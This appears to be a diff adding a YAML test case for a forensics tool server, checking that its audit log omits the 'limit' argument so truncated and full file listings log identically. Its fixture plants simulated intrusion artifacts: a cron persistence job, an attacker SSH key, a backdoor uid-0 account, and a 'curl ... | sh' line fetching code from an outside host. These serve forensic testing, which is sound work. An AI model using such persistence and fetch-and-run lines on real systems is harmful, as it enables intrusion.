@@ -1,0 +1,76 @@
+# Matrix case P3075-063: each findevil tool picks by hand which arguments go
+# into its audit entry, and find_recent_changes records only root_path, since
+# and until. limit, which decides how many files the response lists, is not
+# recorded, so a cut list and a full list read back from get_audit_trail with
+# the same params and the same result.
+# The server is started with FINDEVIL_LOGS_DIR=${DB_DIR}, so the call record
+# is ${DB_DIR}/audit.json.
+case_id: P3075-063
+problem: P3075
+server: findevil
+variant: findevil-d1a8d25
+commit: d1a8d25d9c8c05bd66881506cb1f12314ee7c5e1
+display: multi-call
+level: mcp
+realism: common
+realism_ko: "목록이 잘리면 `limit`을 바꿔 다시 부르는 일은 흔하다."
+coverage: full
+summary: 'find_recent_changes over the same window with limit 2 and 200 lists 2 of 5 files and then all 5, but get_audit_trail shows both entries with the same params (root_path, since, until) and the same "5 files" result.'
+summary_ko: "같은 구간에 `find_recent_changes`를 `limit` 2와 200으로 부르면 5개 가운데 2개와 5개 전부가 나온다. 그런데 `get_audit_trail`은 두 항목의 params(`root_path`, `since`, `until`)와 결과 `5 files`를 똑같이 보여 준다."
+defect_ko: "이 서버는 `find_recent_changes`의 기록에 응답 목록의 길이를 정하는 `limit`을 넣지 않는다. 결과를 정하는 인자는 모두 기록해야 한다. 모델은 기록을 보고 두 호출 모두 5개 파일을 받았다고 잘못 알고, 어느 응답이 잘렸는지 되짚지 못한다."
+setup_ko: "공격 구간(02:14~02:30) 안에 바뀐 파일 5개를 두었다."
+fixture:
+  - path: case01/fs/tmp/.x/kworkerd
+    # ELF64 header start
+    hex: 7f454c4602010100000000000000000002003e00
+    mtime: "2026-03-03T02:15:31+00:00"
+  - path: case01/fs/etc/cron.d/kworker
+    text: "*/5 * * * * root /tmp/.x/kworkerd\n"
+    mtime: "2026-03-03T02:16:02+00:00"
+  - path: case01/fs/home/deploy/.ssh/authorized_keys
+    text: "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIB7nq0mJ8S3v2h3Qd9oUe5yTq1kWm0lPZbXwYq6c2rJx attacker@kali\n"
+    mtime: "2026-03-03T02:17:45+00:00"
+  - path: case01/fs/etc/passwd
+    text: "root:x:0:0:root:/root:/bin/bash\ndeploy:x:1001:1001::/home/deploy:/bin/bash\nsysupd:x:0:0::/root:/bin/bash\n"
+    mtime: "2026-03-03T02:18:10+00:00"
+  - path: case01/fs/var/tmp/.cache/update.sh
+    text: "#!/bin/sh\ncurl -s http://203.0.113.50/x | sh\n"
+    mtime: "2026-03-03T02:21:56+00:00"
+steps:
+  - tool: find_recent_changes
+    note_ko: "`limit` 2로 부른다"
+    args:
+      root_path: ${EVIDENCE}/case01/fs
+      since_iso: "2026-03-03T02:14:00+00:00"
+      until_iso: "2026-03-03T02:30:00+00:00"
+      limit: 2
+  - tool: find_recent_changes
+    note_ko: "결함 호출: `limit`만 바꿔 다시 부른다"
+    args:
+      root_path: ${EVIDENCE}/case01/fs
+      since_iso: "2026-03-03T02:14:00+00:00"
+      until_iso: "2026-03-03T02:30:00+00:00"
+      limit: 200
+  - tool: get_audit_trail
+    note_ko: "두 호출의 기록을 다시 읽는다"
+    args:
+      filter_tool: find_recent_changes
+expect:
+  - step: 1
+    note_ko: "첫 응답은 2개만 싣고 나머지 3개를 잘랐다고 한다"
+    contains: "... 3 more matches truncated ..."
+  - step: 1
+    note_ko: "첫 응답에는 뒤쪽 파일이 없다"
+    not_contains: "update.sh"
+  - step: 2
+    note_ko: "둘째 응답은 5개를 모두 싣는다"
+    contains: "update.sh"
+  - step: 3
+    note_ko: "기록에 두 호출이 모두 있다"
+    contains: "(2 matching entries"
+  - step: 3
+    note_ko: "두 항목의 params와 결과가 똑같다"
+    regex: '(?s)params: \{"root_path": "[^"]*/case01/fs", "since": "2026-03-03T02:14:00\+00:00", "until": "2026-03-03T02:30:00\+00:00"\}\n  result: 5 files\n.*params: \{"root_path": "[^"]*/case01/fs", "since": "2026-03-03T02:14:00\+00:00", "until": "2026-03-03T02:30:00\+00:00"\}\n  result: 5 files'
+  - file_not_contains: ${DB_DIR}/audit.json
+    note_ko: "기록 파일 어디에도 `limit`이 없다"
+    text: "limit"
